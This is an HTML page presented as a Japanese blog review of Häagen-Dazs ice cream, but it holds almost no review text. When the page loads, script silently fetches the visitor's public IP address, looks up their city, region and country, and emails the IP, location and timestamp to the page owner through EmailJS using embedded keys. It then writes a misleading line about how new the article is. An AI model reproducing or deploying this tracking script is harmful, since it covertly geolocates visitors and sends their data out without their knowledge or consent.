<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>softcream blog</title>
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("GjJ2lPz32fEipEep4"); // 公開キーをここに
        })();
    </script>
</head>
<body>
    <h1>ハーゲンダッツ 徹底レビュー</h1>
    <div id="status"></div>

    <script>
        // グローバルIPを取得
        fetch('https://api.my-ip.io/ip.json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                // IPを使って住所情報を取得
                fetch(`http://ip-api.com/json/${ip}`)
                    .then(response => response.json())
                    .then(geoData => {
                        const address = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
                        sendIpViaEmail(ip, address);
                    })
                    .catch(error => {
                        console.error('住所取得エラー:', error);
                        // 住所取得に失敗した場合、IPのみでメール送信
                        sendIpViaEmail(ip, '住所不明');
                    });
            })
            .catch(error => {
                console.error('IP取得エラー:', error);
                document.getElementById('status').textContent = 'IP取得に失敗しました';
            });

        // EmailJSでIPと住所を送信
        function sendIpViaEmail(ip, address) {
            const templateParams = {
                ip: ip + address,
                timestamp: new Date().toISOString()
            };

            emailjs.send("service_r38oq44", "template_soooype", templateParams)
                .then(response => {
                    document.getElementById('status').textContent = 'メール送信成功！';
                    console.log('送信成功:', response.status, response.text);
                    document.write("この記事は最新です");
                })
                .catch(error => {
                    document.getElementById('status').textContent = 'メール送信に失敗しました';
                    console.error('送信エラー:', error);
                    document.write("この記事が作成されたのは3年前です");
                });
        }
    </script>
</body>
</html>
